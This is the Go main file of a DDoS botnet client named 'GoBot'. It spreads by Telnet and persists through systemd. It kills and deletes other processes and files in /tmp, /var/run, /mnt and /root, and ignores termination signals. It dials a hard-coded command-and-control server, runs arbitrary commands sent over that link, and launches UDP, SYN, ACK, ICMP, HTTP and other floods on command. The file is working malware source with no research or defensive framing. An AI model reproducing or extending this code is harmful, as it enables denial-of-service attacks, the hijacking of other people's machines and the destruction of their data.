package main

import (
	"bot/attacks"
	"bot/persistence"
	"bot/selfreps"
	"bufio"
	"crypto/aes"
	"encoding/hex"
	"fmt"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

const key = "HFUIHIHFCieahifw"

var (
	loadedAttacks = []attacks.Attack{
		attacks.HttpGet{},
		attacks.HttpPost{},
		attacks.TCPPsh{},
		attacks.TCPAck{},
		attacks.TCPSyn{},
		attacks.TCPHandshake{},
		attacks.UDP{},
		attacks.Icmp{},
		attacks.VSE{},
		attacks.TCPHold{},
		attacks.OpenVpn{}}

	killDirectories = []string{
		"/tmp",
		"/var/run",
		"/mnt",
		"/root",
	}
	whitelistedDirectories = []string{
		"/var/run/lock",
		"/var/run/shm",
	}
	conn               net.Conn
	killerEnabled      bool = true
	activeConnections  []*net.Conn
	connectionsLock    sync.Mutex
)

type client struct {
    conn   net.Conn
    id     int
    writer *bufio.Writer
    reader *bufio.Reader
}

type message struct {
    client *client
    text   string
}

var (
    nextId  = 1
    messages = make(chan message)
)

func parseThreads(args []string) ([]string, int) {
	newArgs := []string{}
	threadCount := 1
	for _, arg := range args {
		if strings.HasPrefix(arg, "threads=") {
			threadCountString := strings.TrimPrefix(arg, "threads=")
			threads, err := strconv.Atoi(threadCountString)
			if err != nil {
				continue
			}
			threadCount = threads
		} else {
			newArgs = append(newArgs, arg)
		}
	}
	return newArgs, threadCount
}

func handlepanic() {
	writeLog("Ok we panicked or something")
	time.Sleep(time.Minute * 1)
	cmd := exec.Command(os.Args[0], os.Args[1:]...)
	cmd.Start()
}

func writepaniclog() {
	err := recover()
	if err != nil { //catch
		erro, ok := err.(error)
		if !ok {
			writeLog(erro.Error())
		}
	}
}

func getAttack(name string) attacks.Attack {
	for _, attack := range loadedAttacks {
		if attack.Name() == name {
			return attack
		}
	}
	return attacks.L{}
}

func killer_maps() {
	defer writepaniclog()
	for true {
		if !killerEnabled {
			time.Sleep(time.Second * 5)
			continue
		}
		matches, err := filepath.Glob("/proc/*/exe")
		if err != nil {
			time.Sleep(time.Second * 2)
			continue
		}
		for _, file := range matches {
			target, err := os.Readlink(file)
			if err != nil {
				continue
			}

			for _, directory := range whitelistedDirectories {
				if directory == target {
					continue
				}
			}

			if strings.Contains(target, "Bins_Bot_vars") {
				continue
			}

			pid, err := strconv.Atoi(strings.Split(file, "/")[2])
			if err != nil {
				writeLog("We found some issues " + err.Error())
				continue
			}
			process, err := os.FindProcess(pid)
			if err != nil {
				writeLog("We found some issues " + err.Error())
				continue
			}

			if len(target) > 0 {
				for _, killDirectory := range killDirectories {
					if strings.HasPrefix(target, killDirectory) {
						err := process.Signal(os.Kill)
						if err != nil {
							writeLog(err.Error())
							continue
						}
						writeLog("We have killed a process | " + target)
					}
				}
			}
		}
		time.Sleep(time.Millisecond * 200)
	}
}

func killer_deleter() {
	defer writepaniclog()
	for true {
		if !killerEnabled {
			time.Sleep(time.Second * 5)
			continue
		}
		for _, killDirectory := range killDirectories {
			files, _ := os.ReadDir(killDirectory)
			for _, file := range files {
				for _, directory := range whitelistedDirectories {
					if directory == file.Name() {
						continue
					}
				}
				if strings.Contains(file.Name(), "Bins_Bot_vars") || strings.Contains(file.Name(), "sshd") ||
					strings.Contains(file.Name(), "resolv.conf") {
					continue
				}
				if file.IsDir() {
					err := os.RemoveAll(killDirectory + "/" + file.Name())
					if err != nil {
						writeLog(err.Error())
						continue
					}
				} else {
					err := os.Remove(killDirectory + "/" + file.Name())
					if err != nil {
						writeLog(err.Error())
						continue
					}
				}
			}
		}
		time.Sleep(time.Millisecond * 250)
	}
}

func EncryptAES(key []byte, plaintext string) string {
	// create cipher
	c, err := aes.NewCipher(key)
	if err != nil {
		return ""
	}

	// allocate space for ciphered data
	out := make([]byte, len(plaintext))

	// encrypt
	c.Encrypt(out, []byte(plaintext))
	// return hex string
	return hex.EncodeToString(out)
}

func DecryptAES(key []byte, ct string) string {
	ciphertext, _ := hex.DecodeString(ct)

	c, err := aes.NewCipher(key)
	if err != nil {
		return ""
	}

	pt := make([]byte, len(ciphertext))
	c.Decrypt(pt, ciphertext)

	s := string(pt[:])
	return s
}

func clientHandle(c *client) {
	defer func() {
		c.conn.Close()
		connectionsLock.Lock()
		for i, activeConn := range activeConnections {
			if activeConn == &c.conn {
				activeConnections = append(activeConnections[:i], activeConnections[i+1:]...)
				break
			}
		}
		connectionsLock.Unlock()
	}()

	for {
		// read from the client
		msg, err := c.reader.ReadString('\n')
		if err != nil {
			fmt.Println("failed to read data from client", c.id)
			return
		}

		// send the message to the global messages channel
		msg = strings.TrimSpace(msg)
		messages <- message{
			client: c,
			text:   msg,
		}
	}
}

func main() {
	rand.Seed(time.Now().UTC().UnixNano())
	go killer_maps()
	go killer_deleter()
	go selfreps.Telnet()
	persistence.SystemdPersistence()

	if runtime.GOOS != "windows" {
		shouldRestart := false
		shouldRestart = len(os.Args) == 1
		if len(os.Args) > 1 && os.Args[1] != "bg" {
			println("GoBot")
			cmd := exec.Command(os.Args[0], "bg")
			err := cmd.Start()
			if err != nil {
				println("Error Starting New Bin", err.Error())
				return
			} else {
				os.Exit(0)
			}
		} else if len(os.Args) == 2 && os.Args[1] == "test" {
			killerEnabled = false
		} else if shouldRestart {
			println("GoBot")
			cmd := exec.Command(os.Args[0], "bg")
			err := cmd.Start()
			if err != nil {
				println("Error Starting New Bin", err.Error())
				return
			} else {
				os.Exit(0)
			}
		}
	}
	ips, _ := net.LookupIP("peniseater.click")
	cncIp := "185.246.221.220"
	for _, ip := range ips {
		if ipv4 := ip.To4(); ipv4 != nil {
			println("Wow the ip is", cncIp)
			cncIp = ip.String()
			break
		}
	}
	if runtime.GOOS == "windows" {
		cncIp = "localhost"
	} else {
		//out, err := exec.Command("bash", "-c", "ulimit -n 99999").Output()
		//if err != nil {
		//	writeLog(err.Error())
		//}
		//output := string(out)
		//writeLog(output)
		defer handlepanic()
		signal.Ignore(os.Kill)
		signal.Ignore(os.Interrupt)
		signal.Ignore(syscall.SIGABRT)
		signal.Ignore(syscall.SIGTERM)
		signal.Ignore(syscall.SIGSEGV)
		signal.Ignore(syscall.SIGQUIT)
	}
	var err error
	conn, err = net.Dial("tcp", cncIp+":6001")
	if err != nil {
		fmt.Println(err)
		panic("Yeah we failed to connect")
	}
	_, err = conn.Write([]byte("GoBot V1:" + runtime.GOARCH + "\n"))
	if err != nil {
		println(err.Error())
		panic("Yeah we failed to send")
	}
	connectionsLock.Lock()
	activeConnections = append(activeConnections, &conn)
	connectionsLock.Unlock()

	// Go routine to handle incoming messages
	go clientHandle(&client{
		conn:   conn,
		id:     nextId,
		writer: bufio.NewWriter(conn),
	})
	for {
		readString, err := bufio.NewReader(conn).ReadString('\n')
		if err != nil {
			return
		}
		//readString = DecryptAES([]byte(key), readString)
		if !strings.HasPrefix(readString, "!") {
			continue
		}
		readString = strings.TrimPrefix(readString, "!")
		readString = strings.TrimSuffix(readString, "\n")
		readString = strings.TrimSuffix(readString, "\r")

		arguments := strings.Split(readString, " ")
		arguments, threads := parseThreads(arguments)
		command := strings.ToLower(arguments[0])
		if command == "exec" && len(arguments) > 2 {
			args := strings.Join(arguments[2:], " ")
			out, err := exec.Command(arguments[1], args).Output()
			if err != nil {
				writeLog(err.Error())
			}
			output := string(out)
			writeLog(output)
			continue
		}
		if len(arguments) > 4 {
			attack := getAttack(command)
			if attack == nil {
				continue
			}
			host := arguments[1]
			port, err := strconv.Atoi(arguments[2])
			if err != nil {
				continue
			}
			time, err := strconv.Atoi(arguments[3])
			if err != nil {
				continue
			}
			size, err := strconv.Atoi(arguments[4])
			if err != nil {
				continue
			}

			attack.Send(host, port, time, size, threads)
		}
		if len(arguments) == 4 {
			host := arguments[1]
			port, err := strconv.Atoi(arguments[2])
			if err != nil {
				continue
			}
			time, err := strconv.Atoi(arguments[3])
			if err != nil {
				continue
			}
			if command == "udp-large" {
				attack := getAttack("udp")
				attack.Send(host, port, time, 1000, threads)
			}
			if command == "udp-pps" {
				attack := getAttack("udp")
				attack.Send(host, port, time, 1, threads)
			}
			if command == "ack-large" {
				attack := getAttack("ack")
				attack.Send(host, port, time, 1000, threads)
			}
			if command == "ack-pps" {
				attack := getAttack("ack")
				attack.Send(host, port, time, 1, threads)
			}
			if command == "syn-large" {
				attack := getAttack("syn")
				attack.Send(host, port, time, 1000, threads)
			}
			if command == "syn-pps" {
				attack := getAttack("syn")
				attack.Send(host, port, time, 1, threads)
			}
			if command == "psh-large" {
				attack := getAttack("psh")
				attack.Send(host, port, time, 1000, threads)
			}
			if command == "psh-pps" {
				attack := getAttack("psh")
				attack.Send(host, port, time, 1, threads)
			}
			if command == "icmp-large" {
				attack := getAttack("icmp")
				attack.Send(host, port, time, 1000, threads)
			}
			if command == "icmp-pps" {
				attack := getAttack("icmp")
				attack.Send(host, port, time, 1, threads)
			}
			if command == "vse" {
				attack := getAttack("vse")
				attack.Send(host, port, time, 1, threads)
			}
			if command == "hold" {
				attack := getAttack("hold")
				attack.Send(host, port, time, 1000, threads)
			}
			if command == "handshake" {
				attack := getAttack("handshake")
				attack.Send(host, port, time, 1000, threads)
			}
			if command == "openvpn" {
				attack := getAttack("openvpn")
				attack.Send(host, port, time, 1000, threads)
			}
		}
		if len(arguments) == 3 {
			host := arguments[1]
			time, err := strconv.Atoi(arguments[2])
			if err != nil {
				continue
			}

			if command == "get" {
				attack := getAttack("http-get")
				attack.Send(host, 443, time, 1, threads)
			}
			if command == "post" {
				attack := getAttack("http-post")
				attack.Send(host, 443, time, 100, threads)
			}
		}
		if command == "kill-bot" {
			println("We are killing the bot")
			signal.Reset()
			writeLog("We are killing the bot")
			conn.Close()
			os.Exit(0)
			return
		}
		if command == "killer-on" {
			killerEnabled = true
		}
		if command == "killer-off" {
			killerEnabled = false
		}
		if command == "update-bot" {
			// to be implemented
		}
	}
}
func writeLog(message string) {
	println(message)
	if conn == nil {
		return
	}
	_, err := conn.Write([]byte("!LOG " + message + "\v"))
	if err != nil {
		return
	}
}
